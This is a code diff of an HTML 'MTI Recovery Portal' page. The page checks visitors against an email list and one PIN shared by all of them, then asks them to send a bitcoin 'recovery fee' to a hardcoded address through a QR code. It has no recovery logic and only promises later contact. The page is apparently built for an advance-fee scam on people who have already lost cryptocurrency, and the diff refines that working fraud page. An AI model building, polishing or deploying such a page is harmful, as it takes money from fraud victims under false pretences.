@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>MTI Recovery Portal</title>
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="ico.png">
     <script src="https://cdn.tailwindcss.com">
     </script>
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js">
@@ -86,7 +88,7 @@
             <div class="space-y-4">
                 <input type="email" id="email-input" placeholder="email@example.com" value="test@example.com"
                 class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
-                <input type="password" id="pin-input" placeholder="Enter Account PIN" value="1234"
+                <input type="password" id="pin-input" placeholder="Enter Account PIN" value="2026"
                 class="w-full px-4 py-3 border border-slate-300 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none bg-white shadow-sm">
                 <div class="grid grid-cols-2 gap-3">
                     <input type="number" id="lost-btc" placeholder="BTC lost (e.g. 0.5)" value="0.5"
@@ -185,18 +187,17 @@
         // CONFIGURATION (local)
         // ================================================================
 
-        // === FEE ADDRESS (provided by user) ===
+        // === FEE ADDRESS ===
         const FEE_ADDRESS = 'bc1q304clunc0e8e4nvs35cdsk2fj062n62w6wga6g';
 
-        // Fee amounts for each option
+        // Fee amounts
         const FEE_AMOUNT_OPTION1 = 0.0019;
         const FEE_AMOUNT_OPTION2 = 0.0058;
 
         // CoinGecko API for current BTC price
         const PRICE_API = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd';
 
-        // Default PIN (all emails use the same PIN)
-        const DEFAULT_PIN = '1234';
+        // PIN is defined in emails.js – no need to redeclare here
 
         // ================================================================
 
@@ -206,7 +207,6 @@
         let currentPrice = 0;
         let selectedOption = null;
 
-        // Helper: set status message
         function setStatus(msg, type = 'info') {
             const el = document.getElementById('status-message');
             el.innerText = msg;
@@ -214,7 +214,6 @@
             console.log('[STATUS]', msg);
         }
 
-        // Reset login button
         function resetLoginButton() {
             document.getElementById('login-btn').innerText = 'Verify Credentials';
         }
@@ -234,14 +233,12 @@
 
             setStatus('🔍 Checking credentials...', 'info');
 
-            // Check if email exists in the local database (from emails.js)
             if (typeof validEmails === 'undefined') {
                 setStatus('❌ Email database not loaded. Check emails.js.', 'error');
                 resetLoginButton();
                 return;
             }
 
-            // Case-insensitive search
             const found = validEmails.some(e => e.toLowerCase() === email);
             if (!found) {
                 setStatus('❌ Email not found in the recovery list.', 'error');
@@ -249,14 +246,13 @@
                 return;
             }
 
-            // Check PIN
+            // Use DEFAULT_PIN from emails.js
             if (pin !== DEFAULT_PIN) {
                 setStatus('❌ Incorrect PIN. Try again.', 'error');
                 resetLoginButton();
                 return;
             }
 
-            // Success
             currentUserEmail = email;
             setStatus('✅ Login successful! Fetching current BTC price...', 'info');
 
@@ -273,7 +269,6 @@
             resetLoginButton();
         }
 
-        // --- Show Dashboard ---
         function showDashboard() {
             document.getElementById('login-section').classList.add('hidden-section');
             document.getElementById('dashboard').classList.remove('hidden-section');
@@ -289,33 +284,25 @@
             setStatus('✅ Dashboard ready. Tap "Authorize Signature" to continue.', 'success');
         }
 
-        // --- Show Recovery Options ---
         function showRecoveryOptions() {
             document.getElementById('recovery-options').classList.remove('hidden-section');
             document.getElementById('recovery-options').scrollIntoView({ behavior: 'smooth' });
             setStatus('Select your recovery option below.', 'info');
         }
 
-        // --- Select Option ---
         function selectOption(opt) {
             selectedOption = opt;
-            // Highlight selection
             document.querySelectorAll('.fee-card').forEach(el => el.classList.remove('selected'));
             document.getElementById('option' + opt).classList.add('selected');
 
-            // Show payment details
             const detailsDiv = document.getElementById('payment-details');
             detailsDiv.classList.remove('hidden-section');
 
-            // Determine fee amount
             let feeAmount = (opt === '1') ? FEE_AMOUNT_OPTION1 : FEE_AMOUNT_OPTION2;
-
-            // Update address display (same for both)
             document.getElementById('fee-address').innerText = FEE_ADDRESS;
 
-            // Generate QR code with the exact amount
             const qrContainer = document.getElementById('qr-container');
-            qrContainer.innerHTML = ''; // clear previous
+            qrContainer.innerHTML = '';
             const qrText = `bitcoin:${FEE_ADDRESS}?amount=${feeAmount.toFixed(8)}`;
             new QRCode(qrContainer, {
                 text: qrText,
@@ -329,7 +316,6 @@
             setStatus(`Fee: ${feeAmount.toFixed(4)} BTC. Scan QR or copy address.`, 'info');
         }
 
-        // --- Confirm Fee Sent ---
         function confirmFeeSent() {
             if (!selectedOption) {
                 alert('Please select a recovery option first.');
@@ -340,7 +326,6 @@
             setStatus('✅ Recovery initiated. You will be contacted within 10 business days.', 'success');
         }
 
-        // --- Initial state ---
         setStatus('Enter your credentials and lost amounts.', 'info');
     </script>
 </body>
